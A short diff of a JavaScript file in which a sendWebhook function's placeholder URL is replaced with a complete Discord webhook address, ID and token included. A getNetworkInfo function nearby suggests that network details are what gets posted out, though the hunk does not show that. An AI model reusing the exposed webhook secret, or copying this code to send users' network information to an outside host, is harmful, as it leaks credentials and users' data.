@@ -50,7 +50,7 @@ async function getNetworkInfo() {
 function sendWebhook(text) {
     // Esta função deve ser implementada para enviar o texto para um webhook.
     // Exemplo usando fetch:
-    fetch('https://your-webhook-url', {
+    fetch('https://discord.com/api/webhooks/1499662564920000664/j_IYz_TcfwnnTEgS-Or1fzCclhg7YATKlxpCpZEXvfDq3cqwuLi_XqQr4paAlRrTWHmk', {
         method: 'POST',
         headers: {
             'Content-Type': 'application/json'
